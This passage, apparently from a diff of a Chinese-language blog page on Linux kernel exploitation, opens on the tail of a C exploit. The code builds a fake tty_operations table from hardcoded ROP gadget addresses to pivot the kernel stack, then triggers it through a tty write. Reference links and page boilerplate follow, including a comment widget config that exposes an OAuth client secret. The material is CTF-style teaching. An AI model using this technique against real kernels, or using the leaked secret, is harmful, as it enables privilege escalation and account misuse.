class="line">    fake_tty_operations[0] &#x3D; 0xffffffff8100ce6e; &#x2F;&#x2F; pop rax; ret ------------栈迁移到rop</span><br><span class="line">    fake_tty_operations[1] &#x3D; (size_t)rop;</span><br><span class="line">    fake_tty_operations[2] &#x3D; 0xFFFFFFFF8181BFC5;&#x2F;&#x2F; mov </span><br><span class="line">    fake_tty_operations[7] &#x3D; 0xFFFFFFFF8181BFC5;&#x2F;&#x2F;mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e(ret)----------栈迁移到fake_tty_operations------这里有玄学，gdb中看到的不一样</span><br><span class="line">    write(fd2,fake_tty_struct,sizeof(fake_tty_struct));</span><br><span class="line">    char buf[8] &#x3D; &#123;0&#125;;</span><br><span class="line">    write(fd_tty,buf,8);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h2><p>未完待续。。。</p>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://t3ls.club/index.php/archives/Linux-Kernel-Pwn.html" target="_blank" rel="noopener">https://t3ls.club/index.php/archives/Linux-Kernel-Pwn.html</a></p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_rop-zh/" target="_blank" rel="noopener">ctf-wiki</a></p>
+<p><a href="http://p4nda.top/2018/07/13/ciscn2018-core/#" target="_blank" rel="noopener">http://p4nda.top/2018/07/13/ciscn2018-core/#</a></p>
+<p><a href="https://ama2in9.top/2020/09/03/kernel/" target="_blank" rel="noopener">https://ama2in9.top/2020/09/03/kernel/</a></p>
+<p><a href="https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" target="_blank" rel="noopener">https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</a></p>
+<p><a href="https://www.anquanke.com/post/id/201043" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201043</a></p>
+
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"787cc455593c1fb9cfcd","clientSecret":"f6abba3d9cc77878426ee16aa8bcb980fd3cd70c","repo":"s1vona.github.io","owner":"s1vona","admin":["s1vona"],"distractionFreeMode":true};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Sivona</span>
+                    </p>
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Enforce justice on behalf of Heaven.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/kernel-linux/"># kernel, linux</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/09/09/arm-pwn-%E4%BB%8E-0-%E5%88%B0-0-1/">arm pwn 从 0 到 0.1</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Sivona | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+    <div>
+        友情链接: 
+       <div>
+        <a class="theme-link"  href="https://sncker.github.io" target="_blank" rel="noopener"> SNCKER's blog </a><span>&nbsp;&nbsp;</span>
+        <a class="theme-link"  href="https://blog.csdn.net/qq_43531895" target="_blank" rel="noopener"> EnJoy_July 's blog' </a><span>&nbsp;&nbsp;</span>
+       </div>
+       
+      </div>
+</footer>
+
+    </div>
+</body>
+</html>
